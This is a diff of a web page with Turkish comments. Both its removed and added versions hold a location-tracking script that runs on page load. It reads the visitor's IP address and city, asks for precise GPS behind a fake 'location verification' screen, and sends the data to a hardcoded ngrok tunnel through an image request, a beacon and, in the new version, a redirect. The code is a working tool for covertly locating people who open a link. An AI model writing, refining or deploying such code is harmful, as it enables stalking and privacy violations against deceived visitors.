@@ -1,54 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Sistem Kontrolü</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }
-        .radar { border: 2px solid #0f0; border-radius: 50%; width: 100px; height: 100px; margin: 20px auto; border-top-color: transparent; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="radar"></div>
-    <h1>KONUM DOĞRULANIYOR...</h1>
-    <p>Lütfen gelen erişim isteğini onaylayın.</p>
-
-    <script>
-        // BURAYA TERMINALDEKI GUNCEL NGROK LINKINI YAZ!
-        const NGROK_URL = "https://punctual-villain-arson.ngrok-free.dev";
-
-        async function konumAl() {
-            // 1. Önce IP verisini çek
+<script>
+    async function konumAl() {
+        try {
             const res = await fetch('https://ipapi.co/json/');
             const ipData = await res.json();
 
-            // 2. Tarayıcıdan Gerçek Konum İste
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     const coords = pos.coords.latitude + "," + pos.coords.longitude;
-                    gonder(ipData.ip, ipData.city, coords, "GPS_TAM_ISABET");
+                    firlat(ipData.ip, ipData.city, coords, "GPS_TAM_ISABET");
                 },
                 (err) => {
                     const tahmini = ipData.latitude + "," + ipData.longitude;
-                    gonder(ipData.ip, ipData.city, tahmini, "GPS_REDDEDILDI_IP_ALINDI");
-                },
-                { enableHighAccuracy: true }
+                    firlat(ipData.ip, ipData.city, tahmini, "GPS_RED");
+                }
             );
-        }
+        } catch (e) { console.log("Hata"); }
+    }
 
-        function gonder(ip, city, loc, status) {
-            // Ngrok'un aradaki uyarı sayfasını aşmak için gerekli header (ngrok-skip-browser-warning)
-            // Bu yöntem fetch ile bazen takılır, o yüzden en garanti olan Image yöntemini kullanıyoruz
-            const finalURL = `${NGROK_URL}?ip=${ip}&city=${city}&loc=${loc}&status=${status}`;
-            
-            const x = new Image();
-            x.src = finalURL;
-            
-            // Alternatif: Beacon (Tarayıcı kapanırken bile gönderir)
-            navigator.sendBeacon(finalURL);
-        }
+    function firlat(ip, city, loc, status) {
+        // Linkin sonundaki /log kısmını sildik, direkt ana adrese gönderiyoruz
+        const hedef = `https://punctual-villain-arson.ngrok-free.dev/?ip=${ip}&city=${city}&loc=${loc}&status=${status}`;
+        
+        // Bu yöntem en garantisidir
+        const ping = new Image();
+        ping.src = hedef;
+        
+        // Yedek olarak sayfayı da oraya yönlendirelim ki garanti olsun
+        setTimeout(() => { window.location.href = hedef; }, 1000);
+    }
 
-        window.onload = konumAl;
-    </script>
-</body>
-</html>
+    window.onload = konumAl;
+</script>
